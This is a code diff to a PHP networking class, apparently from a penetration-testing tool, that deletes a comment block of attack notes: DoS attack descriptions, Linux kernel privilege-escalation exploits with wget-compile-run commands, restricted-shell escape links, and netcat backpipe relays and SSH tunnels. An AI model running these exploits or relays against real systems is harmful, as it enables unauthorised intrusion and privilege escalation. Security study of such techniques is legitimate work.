@@ -146,107 +146,6 @@ class LAN extends SERVICE4COM{
 	
 	
 
-	/*
-	 http://tools.kali.org/information-gathering/fragroute
-	 http://tools.kali.org/stress-testing/inundator
-	
-	 In a fraggle DoS attack, an attacker sends a large amount of UDP echo requests traffic to the IP broadcast addresses. These UDP requests have a spoofed
-	 source address of the intended victim. If the routing device delivering traffic to those broadcast addresses delivers the IP broadcast to all the hosts, most of the IP
-	 addresses send an ECHO reply message. However, on a multi-access broadcast network, hundreds of computers might reply to each packet when the target
-	 network is overwhelmed by all the messages sent simultaneously. Due to this, the network becomes unable to provide services to all the messages and crashes.
-	 In a Land attack, the attacker sends a spoofed TCP SYN packet in which the IP address of the target is filled in both the source and detination fields. On recieving
-	 the spoofed packet, the target system becomes confused and goes into a frozen state. Now-a-days, antivirus can easily detect such an attack.
-	
-https://bitvijays.github.io/LFC-VulnerableMachines.html	
-
-
-
-
-
-
-
-
-
-
-
-Exploits worth running
-
-CVE-2010-3904 - Linux RDS Exploit - Linux Kernel <= 2.6.36-rc8
-
-https://www.exploit-db.com/exploits/15285/
-
-Linux Kernel <= 2.6.37 'Full-Nelson.c'
-
-https://www.exploit-db.com/exploits/15704/
-
-CVE-2012-0056 - Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)
-
-https://git.zx2c4.com/CVE-2012-0056/about/
-
-Linux CVE 2012-0056
-
-wget -O exploit.c <http://www.exploit-db.com/download/18411>
-  gcc -o mempodipper exploit.c
-  ./mempodipper
-
-CVE-2016-5195 - Dirty Cow - Linux Privilege Escalation - Linux Kernel <= 3.19.0-73.8
-
-https://dirtycow.ninja/
-
-Compile dirty cow:
-
- g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
-
-
-
-
-
-
-
-
-
-
-
-
-test on restricted bash 
-
-rbash
-rksh
-rzsh
-lshell
- 
- https://fireshellsecurity.team/restricted-linux-shell-escaping-techniques/
- https://www.asafety.fr/reverse-shell-one-liner-cheat-sheet/
- 
- https://resources.infosecinstitute.com/privilege-escalation-linux-live-examples/#gref
- 
- 
-         
- 
-
-
-  
-  # fpipe
-# FPipe.exe -l [local port] -r [remote port] -s [local port] [local IP]
-FPipe.exe -l 80 -r 80 -s 80 192.168.1.7
-
-# ssh -[L/R] [local port]:[remote ip]:[remote port] [local user]@[local ip]
-ssh -L 8080:127.0.0.1:80 root@192.168.1.7    # Local Port
-ssh -R 8080:127.0.0.1:80 root@192.168.1.7    # Remote Port
-
-# mknod backpipe p ; nc -l -p [remote port] < backpipe  | nc [local IP] [local port] >backpipe
-mknod backpipe p ; nc -l -p 8080 < backpipe | nc 10.1.1.251 80 >backpipe    # Port Relay
-mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow 1>backpipe    # Proxy (Port 80 to 8080)
-mknod backpipe p ; nc -l -p 8080 0 & < backpipe | tee -a inflow | nc localhost 80 | tee -a outflow & 1>backpipe    # Proxy monitor (Port 80 to 8080)
-
-
-Is tunnelling possible? Send commands locally, remotely
-ssh -D 127.0.0.1:9050 -N [username]@[ip] 
-proxychains ifconfig
-
-
-         
-	 */
 	
 	
 	public function __construct($eth,$domain,$ip,$port,$protocol,$stream) {
@@ -263,6 +162,7 @@ proxychains ifconfig
 	        $this->stream = $stream;	
 	        
 	        //var_dump($this->stream);echo get_resource_type($this->stream);$this->pause();
+	        //var_dump(stream_get_transports());var_dump(stream_get_filters());$this->pause();
 	    }
 	    
 	   
